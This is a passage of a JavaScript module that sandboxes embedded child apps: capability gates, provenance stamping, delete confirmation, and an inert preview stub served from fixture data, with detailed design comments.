  // Chunked-upload ids THIS guard opened. Per-guard (so per mounted child), which is the whole
  // point: an id another app holds is not in this set and cannot be appended to.
  const myUploads = new Set();

  // The other half of the control-plane instrument (the server half is in engine.mjs). A refusal
  // here never reaches a server — this guard runs in the embedder's document — so the only place
  // it can be recorded is the widget console. Name, tier and preset only: enough to answer "was it
  // us?", nothing that could carry a user's data.
  const refuseControlPlane = (tn) => {
    try { console.warn(`[oma] control-plane refused: ${tn} (app=${name} tier=${tier || "?"} preset=${preset})`); } catch {}
    throw new Error('tool "' + tn + '" is not available to apps');
  };

  const inScope = (id) => (snap().items || []).some((i) => i.id === id);
  // NO expected_version on the typed writes — LAST-WRITE-WINS, the same policy direct mode chose
  // and for the same reason (shell-runtime's long note: a widget write is the user rapid-clicking
  // their OWN UI, and sending the version they were last SHOWN made the second click carry a
  // pre-echo stale one). Here it was worse than a visible error: the guard hands the conflict back
  // as an isError result, the child bridge RESOLVES with it, and an app that doesn't inspect
  // the return value loses the write with nothing on screen. Two policies for one verb, split by
  // tier, is also exactly the drift seam this module exists to remove (Leo 2026-07-27).
  // Explicit OCC is still reachable: a caller that genuinely needs it passes expected_version
  // through the generic callTool path, where it is the caller's own stated intent.
  // Every proxied write is stamped with the child's identity — the shadow via edge (row #8,
  // object form, frozen). FORCED, never taken from the child's own args.
  const via = () => viaOf(name);

  function settingsGuard(target) {
    if (String(target == null ? "" : target).trim() === "settings" && caps.settings_write !== true) throw new Error("settings write denied");
  }

  // The EMBEDDER's axis over its child: allow, deny, or "confirm" — and "confirm" no longer
  // means "the runner asks". It used to call window.confirm, which the sandbox BLOCKS, so in
  // every real host the middle tier silently degraded to deny; and once the engine grew its own
  // confirmation the two could also both fire, asking the user twice for one delete (codex
  // review named this the clearest over-built part). Now the tier says what it means —
  // "this app's deletes MUST be confirmed, whatever the preference says" — and the engine's
  // single, row-and-version-pinned prompt does the asking. Raising the requirement is all a
  // caller can do with the flag, so it is safe to carry across the tool boundary from anyone.
  function deleteGate(ta) {
    if (caps.delete_items === "allow") return;
    if (caps.delete_items === "confirm") { ta.require_confirmation = true; return; }
    notify('App "' + name + '" tried to delete an item — denied by policy.');
    throw new Error("delete denied");
  }

  // The confirm-and-resend loop is runtime-core's (withConfirmation) — one implementation for
  // both runtimes. Here it wraps the CHILD's calls: the demand is rendered in the PARENT shell's
  // chrome and the child's promise simply stays pending until the user answers, so an embedded
  // app needs no confirmation code at all.
  const confirmable = withConfirmation({ send: (tn, ta) => io.callTool(tn, ta), ask: io.requestConfirm });

  async function proxySetPref(a) {
    const key = a.key, value = a.value;
    if (typeof key !== "string" || !/^[a-z][a-z0-9_]{0,31}$/.test(key) || /^(security_|_)/.test(key)) throw new Error("setPref: invalid or reserved key");
    const t = typeof value;
    if (t !== "string" && t !== "number" && t !== "boolean") throw new Error("setPref: value must be a scalar");
    if (t === "string" && value.length > 4096) throw new Error("setPref: value too long");
    const rows = (await io.readCollection("settings")).items || [];
    const it = rows.slice().reverse().find((i) => i.group === name && i.fields && i.fields.key === key);
    const add = () => io.callTool("data_add_item", { command_id: uuid(), collection: "settings", group: name, fields: { key, value }, actor: "human", via: via() });
    let r;
    if (it) {
      r = await io.callTool("data_update_item", { command_id: uuid(), id: it.id, fields: { value }, actor: "human", via: via() });
      if (r && r.isError) r = await add();   // concurrently deleted → re-create
    } else r = await add();
    return r;
  }

  // ---- generic callTool path: control-plane wall → allowlist → per-tool gates ----
  async function guardCallTool(a) {
    const tn = String(a.name || "").trim();
    const ta = Object.assign({}, a.args || {});
    const tl = tn.toLowerCase();
    // Control-plane tools and internal `_` RPC names are NEVER forwarded from a child —
    // checked BEFORE the allowlist/wildcard so no cap combination can reach them.
    if (isControlPlaneTool(tl)) refuseControlPlane(tn);
    if (!wildcard && callAllow.indexOf(tn) === -1) throw new Error('tool "' + tn + '" not allowed');
    if ((tn === "app_html" || tn === "get_app") && caps.read_source !== true) throw new Error("app source read denied");
    if (FILE_READ_TOOLS.has(tn)) {
      if (caps.file_read !== true) throw new Error("file read denied by policy");
      ta.app = name;   // a child reaches its OWN files only
    }
    if (FILE_WRITE_TOOLS.has(tn)) {
      if (caps.file_write !== true) throw new Error("file write denied by policy");
      if (FILE_BIND_TOOLS.has(tn)) ta.app = name;
      else if (UPLOAD_ID_TOOLS.has(tn) && !myUploads.has(String(ta.upload_id == null ? "" : ta.upload_id))) throw new Error("upload_id was not opened by this app");
      // A file delete is a widget's destructive act like any other: it is stamped human so the
      // engine's gate can see who is asking, and it goes through the same confirm-and-resend
      // door. (The file plane carries no `via`, so the per-app preference override does not
      // reach it — the global one does.)
      if (tn === "file_delete") { ta.actor = "human"; if (!ta.command_id) ta.command_id = uuid(); return confirmable(tn, ta); }
    }
    if (tn === "data_collections" && caps.cross_collection_read !== true) throw new Error("cross-collection read denied");
    // Every collection-addressed READ is bound the same way. data_changes was the one left out,
    // and it is the RICHEST of the three — full events, fields and item ids for any collection
    // the child names (the "one missing line = cross-app escape" shape, again).
    if (tn === "data_list" || tn === "data_changes") {
      if (caps.cross_collection_read !== true) ta.collection = coll;   // force the bound collection
    }
    // A batch is the model's bulk verb, not a widget's: forwarding it would need every
    // per-command rule above re-implemented inside the batch — one missed line is a
    // cross-app escape (adversarial F2). Children write one command at a time.
    if (tn === "data_batch") { notify('App "' + name + '" tried data_batch — not available to apps.'); throw new Error(DATA_BATCH_REFUSAL); }
    // A child may call ONLY its own app's functions (the designed free path); the
    // callee is forced, so a second hop through another app is unreachable by shape.
    // actor is stamped like any widget write: a widget's function call is the user
    // acting in their own UI, and the executor threads this actor onto every inner write.
    if (tn === "call_function") {
      ta.app = name;
      ta.via = via();
      ta.actor = "human";
      if (!ta.command_id) ta.command_id = uuid();
    }
    if (DATA_WRITE_TOOLS.has(tn)) return dataWrite(tn, ta, { bound: false });
    const r = await io.callTool(tn, ta);
    // Upload-id bookkeeping rides the RESULT, because the id is minted server-side. A commit
    // consumes the upload either way (files.mjs contract), so the id is retired with it.
    if (tn === "file_write_begin") { const id = r && r.structuredContent && r.structuredContent.upload_id; if (id) myUploads.add(String(id)); }
    else if (tn === "file_write_commit") myUploads.delete(String(ta.upload_id == null ? "" : ta.upload_id));
    return r;
  }

  // ONE write policy for both doors (elegance A16): the typed verbs and the generic data_*
  // names stamp, guard and forward through this single body — provenance, the settings wall,
  // scope, and delete confirmation live exactly once. `bound: true` is the typed door: always
  // the bound collection, always in-scope, whatever the caps say (a typed verb IS the widget
  // acting on its own UI). The generic door consults cross_collection_write.
  //
  // 🔴 Inside: the settings-recognition guard treats an ABSENT or EMPTY settingsIds set as
  // "cannot tell", and a guard that cannot tell refuses (measured 2026-07-29: a failed boot
  // read left the set empty and `settings_write: false` protected nothing).
  async function dataWrite(tn, ta, { bound }) {
    ta.actor = "human";   // runner-stamped provenance
    ta.via = via();       // shadow edge — forced, never child-supplied
    if (tn === "data_add_item") {
      if (bound || caps.cross_collection_write !== true) ta.collection = coll;
      settingsGuard(ta.collection);
    } else {
      settingsGuard(coll);
      const known = io.settingsIds ? io.settingsIds() : null;
      if (!known || known.size === 0 || known.has(ta.id)) settingsGuard("settings");
      if ((bound || caps.cross_collection_write !== true) && !inScope(ta.id)) throw new Error("out of scope");
    }
    if (tn === "data_delete_item") { deleteGate(ta); return confirmable(tn, ta); }
    return io.callTool(tn, ta);
  }

  // ---- the three presets share one skeleton ----
  async function live(method, a) {
    switch (method) {
      case "addItem":
        return dataWrite("data_add_item", { command_id: uuid(), collection: coll, group: a.group || "", fields: a.fields || {}, position: a.position }, { bound: true });
      case "updateItem":
        return dataWrite("data_update_item", { command_id: uuid(), id: a.id, fields: a.fields }, { bound: true });
      case "moveItem":
        return dataWrite("data_move_item", { command_id: uuid(), id: a.id, group: a.group, position: a.position }, { bound: true });
      case "deleteItem":
        return dataWrite("data_delete_item", { command_id: uuid(), id: a.id }, { bound: true });
      case "refresh":
        return io.readCollection(coll);
      case "readCollection": {
        const c = caps.cross_collection_read === true ? String(a.collection || coll) : coll;
        return io.readCollection(c);
      }
      case "filesList":
        if (caps.file_read !== true) throw new Error("file read denied by policy");
        return io.callTool("file_list", { app: name });
      case "filesRead":
        if (caps.file_read !== true) throw new Error("file read denied by policy");
        return io.readFile(name, String(a.path || ""));
      case "setPref":
        // setPref writes the child's OWN group in the settings collection — still a settings
        // WRITE, gated on caps.settings_write (unreviewed default: DENY).
        if (caps.settings_write !== true) throw new Error("setPref denied by policy");
        return proxySetPref(a || {});
      case "callTool":
        return guardCallTool(a || {});
      case "sendMessage":
        if (caps.send_message !== true) {
          notify('App "' + name + '" tried to send a chat message — denied by policy.');
          return { isError: true, content: [{ type: "text", text: "sendMessage denied by policy" }] };
        }
        return io.sendMessage(a.text);
      default:
        throw new Error("unknown " + method);
    }
  }

  // (The "readonly" preset retired 2026-08-04, elegance A8: zero live callers — thumbnails
  // moved to inert long ago and settings' drawer runs live. Two presets, both real.)

  // Inert (App Store fixtures): ZERO host IO. Writes pretend to succeed so demo apps
  // animate; reads answer from the fixed snapshot; everything else resolves empty.
  //
  // Multi-collection apps made "answer from the snapshot" load-bearing: they self-fetch every
  // collection they render (data_list via callTool / readCollection — the GUIDE's canonical
  // pattern), and the old empty-envelope callTool answer read as corrupt data — five of the
  // the App Store's sixteen previews opened on their own error banner. Fixture rows carry a
  // `collection` key (the multi-collection fixtures convention); serve each read the rows it
  // asked for, in the real item shape (raw fixtures ship {collection, group, fields} only).
  const fxRows = (c) => {
    const s = snap();
    const bound = s.collection;
    const want = c == null ? bound : String(c);
    const rows = (s.items || []).filter((it) => ((it && it.collection) || bound) === want);
    const items = rows.map((it, i) => ({ id: "fx-" + i, group: (it && it.group) || "", position: i + 1,
      fields: (it && it.fields) || {}, version: 1 }));
    return { collection: want, items, version: s.version || 1, returned: items.length, total: items.length };
  };
  async function inert(method, a) {
    switch (method) {
      case "addItem": case "updateItem": case "moveItem": case "deleteItem": case "setPref":
        return { ok: true };
      case "refresh": case "readCollection":
        return fxRows(a && a.collection);
      case "callTool": {
        const tn = a && a.name;
        const ta = (a && a.args) || {};
        if (tn === "data_list") return { content: [], structuredContent: fxRows(ta.collection) };
        if (tn === "data_version") return { content: [], structuredContent: { seq: snap().version || 1 } };
        // Meta apps ask WHICH collections exist before they ask for rows (dashboard draws a
        // card per collection). Answering that with an empty envelope makes the preview of an app
        // whose whole job is "show me everything" render as though the user owns nothing — the same
        // failure the multi-collection fxRows work already fixed one call earlier. Derive it from
        // the snapshot the preview was handed: same rows, same truth, still zero host IO.
        // #10: an installed app with an EMPTY collection is invisible to a row-derived answer, so a
        // preview of a meta app lost it entirely when thumbnails moved from readonly (which
        // could read the registry) to inert (which cannot). The snapshot carries the roster when the
        // embedder has one; absent, the honest answer is still an empty list.
        if (tn === "list_apps") return { content: [], structuredContent: { apps: snap().apps || [] } };
        if (tn === "data_collections") {
          const bound = snap().collection;
          const counts = new Map();
          for (const it of snap().items || []) {
            const c = (it && it.collection) || bound;
            counts.set(c, (counts.get(c) || 0) + 1);
          }
          return { content: [], structuredContent: { collections: [...counts].map(([collection, items]) => ({ collection, items })) } };
        }
        return { content: [], structuredContent: {} };
      }
      case "sendMessage":
        return null;
      default:
        return { isError: true, content: [{ type: "text", text: "not available in this preview" }] };
    }
  }

  return preset === "inert" ? inert : live;
}

/** Stub window.oma for a STANDALONE inert preview document (no embedder, no bridge): a
 *  server composing public preview pages has no parent runtime to guard through, so the
 *  document carries an inert oma seeded with a fixture snapshot — reads answer from it,
 *  writes resolve harmlessly, callTool answers empty, and the CSP above kills the network.
 *  This is the parentless twin of the guard's "inert" preset, and the ONE copy of the stub
 *  (its predecessors lived in the App Store app and the hosted data plane, hand-synced).
 *  The close tag is split so this source never contains a literal one; JSON's "</" become
 *  "<\/" (an identity escape in JS strings) so fixture data can't break out of the tag. */
export function stubOmaScript(name, items, apps, prefs) {
  const snap = { collection: name, items: items || [], version: 1, app: name, host: "library-preview",
    ...(apps && apps.length ? { apps } : {}) };
  return "<script>window.oma=(function(){var S=" +
    JSON.stringify(snap).replace(/<\//g, "<\\/") +
    ";var P=" + JSON.stringify(prefs && typeof prefs === "object" ? prefs : {}).replace(/<\//g, "<\\/") +
    ";var ok=Promise.resolve({ok:true});" +
    // Public previews need one deterministic "today" so a story dated 2026-08-06 does not
    // render as the visitor's next day. This shim is opt-in through preview_date and only lives
    // in the inert preview document; the live app runtime never receives this preference.
    "if(P&&typeof(P.preview_date)==='string'&&/^\\d{4}-\\d{2}-\\d{2}$/.test(P.preview_date)){(function(){" +
    "var N=Date,F=new N(P.preview_date+'T12:00:00');if(isNaN(F.getTime()))return;" +
    "function C(a){switch(a.length){case 0:return new N(F.getTime());case 1:return new N(a[0]);case 2:return new N(a[0],a[1]);case 3:return new N(a[0],a[1],a[2]);case 4:return new N(a[0],a[1],a[2],a[3]);case 5:return new N(a[0],a[1],a[2],a[3],a[4]);case 6:return new N(a[0],a[1],a[2],a[3],a[4],a[5]);default:return new N(a[0],a[1],a[2],a[3],a[4],a[5],a[6]);}}" +
    "function D(){if(!(this instanceof D))return new N(F.getTime()).toString();return C(Array.prototype.slice.call(arguments));}" +
    "D.prototype=N.prototype;try{Object.setPrototypeOf(D,N)}catch(e){}D.now=function(){return F.getTime()};D.parse=N.parse;D.UTC=N.UTC;window.Date=D;" +
    "})();}" +
    // Serve the fetch paths from the SAME fixture rows the snapshot carries — the parentless
    // twin of the guard's fxRows, and for the identical reason. It used to answer every
    // readCollection with {items:[]} and every callTool with {}, on the theory that an app
    // reads its data from oma.state. Half of them don't: self-fetching per collection is the
    // GUIDE's canonical pattern, and the guard's inert preset had already learned that an empty
    // envelope reads as CORRUPT data rather than as "no rows". Measured 2026-07-28 on this
    // machine: training-log rendered "0/0 · No entries yet" plus "Refresh failed: training-plan
    // returned invalid data", elder-days "Could not refresh all three data sets" — both with
    // fixtures sitting right there in the document. That is the PUBLIC preview path (hosted
    // /library today, share pages later), i.e. the copy a stranger sees first.
    "function R(c){var b=S.collection,w=(c==null?b:String(c)),o=[];" +
    "for(var i=0;i<S.items.length;i++){var it=S.items[i]||{};if(((it.collection||b))!==w)continue;" +
    "o.push({id:'fx-'+o.length,group:it.group||'',position:o.length+1,fields:it.fields||{},version:1});}" +
    "return {collection:w,items:o,version:S.version||1,returned:o.length,total:o.length};}" +
    // Object.create(null), not {} — a collection name is USER DATA, and `__proto__` / `constructor`
    // are legal names the store accepts. In a bare object literal `m["__proto__"]=1` writes the
    // prototype instead of a key (the collection disappears from the answer) and
    // `m["constructor"]||0` reads the inherited function, so the count came back as
    // "function Object() { [native code] }1". The guard's twin uses a Map and was always right;
    // this is the copy that had to be told.
    "function C(){var b=S.collection,m=Object.create(null),o=[];" +
    "for(var i=0;i<S.items.length;i++){var c=(S.items[i]&&S.items[i].collection)||b;m[c]=(m[c]||0)+1;}" +
    "for(var k in m)o.push({collection:k,items:m[k]});return o;}" +
    "return {get state(){return S},ready:function(cb){try{cb(S)}catch(e){}},onChange:function(){},onPrefChange:function(){}," +
    "pref:function(k,f){return Object.prototype.hasOwnProperty.call(P,k)?P[k]:f},setPref:function(){return ok},addItem:function(){return ok},updateItem:function(){return ok},moveItem:function(){return ok}," +
    "deleteItem:function(){return ok},refresh:function(){return Promise.resolve(R())}," +
    // The same two answers the parented inert guard gives. This is the machine that composes
    // PUBLIC preview pages (hosted /library today, share pages next), and a meta app asks
    // "which collections exist" before it asks for rows — answering that with an empty envelope
    // renders an app whose whole job is "show me everything" as though the user owned nothing.
    "callTool:function(n,a){return Promise.resolve(n==='data_list'?{content:[],structuredContent:R(a&&a.collection)}" +
    ":n==='data_collections'?{content:[],structuredContent:{collections:C()}}" +
    ":n==='list_apps'?{content:[],structuredContent:{apps:S.apps||[]}}" +
    ":{content:[],structuredContent:{}})}," +
    "readCollection:function(c){return Promise.resolve(R(c))}," +
    "files:{list:function(){return Promise.resolve({files:[]})},read:function(){return Promise.reject(new Error(\"not available in this preview\"))},url:function(){return Promise.reject(new Error(\"not available in this preview\"))}}," +
    "sendMessage:function(){return ok},toolInput:{app:S.app,collection:S.collection},standalone:true};})();</scr" +
    "ipt>";
}

/** A complete, self-contained inert preview document: CSP-first, caller-supplied token CSS,
 *  the stub above, and the app markup wholesale in OUR body (same anchoring doctrine
 *  as composeChildDoc). Consumed by the hosted /library preview server — which used to keep
 *  a hand-synced copy of every piece of this. */
// A preview iframe is `sandbox="allow-scripts"` with no `allow-same-origin` — deliberately, so the
// embedder cannot read `contentDocument.scrollHeight` and must be TOLD the height. The live runner
// has said so since it existed, and this document, which is the one every gallery and store page
// actually embeds, did not — so an embedder had no choice but to guess a fixed window, and a
// taller app got cut off with no way to know it had been. Same message, same shape, and now
// literally the same source: an embedder that handles `omaRunHeight` handles both documents,
// and neither can drift into observing less than the other again.
const HEIGHT_BROADCAST =
  "<scr" + "ipt>(function(){" + HEIGHT_BROADCAST_SOURCE +
  "omaWatchHeight(omaSendHeight);})();</scr" + "ipt>";

export function composePreviewDoc(html, { name, items = [], apps = [], prefs = {}, tokenCss = "", kitCss = "" } = {}) {
  return "<!doctype html><html><head>" + RUNNER_CSP +
    '<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">' +
    tokenCss + kitStyle(kitCss) + stubOmaScript(String(name || ""), items, apps, prefs) + "</head><body>" + html +
    HEIGHT_BROADCAST + "</body></html>";
}

/** Walk file_read's byte windows and hand back the whole file as base64 parts + metadata.
 *  Parts are decoded/concatenated by the caller (byte-level, so no alignment assumption).
 *  Lives here because both the direct-mode oma.files and the guard's filesRead share it. */
export async function readFileParts(callTool, app, path) {
  const parts = [];
  let offset = 0, meta = null;
  for (;;) {
    const r = await callTool("file_read", { app, path, ...(offset ? { offset } : {}) });
    if (r && r.isError) { const t = (r.content || []).find((c) => c.type === "text"); throw new Error((t && t.text.split("\n")[0]) || "file read failed"); }
    const sc = r && r.structuredContent;
    if (!sc || typeof sc.data_base64 !== "string") throw new Error("file read returned no bytes");
    if (!meta) meta = { mime: sc.mime, sha256: sc.sha256, size: sc.size };
    parts.push(sc.data_base64);
    if (sc.next_offset == null) return { ...meta, parts };
    offset = sc.next_offset;
  }
}
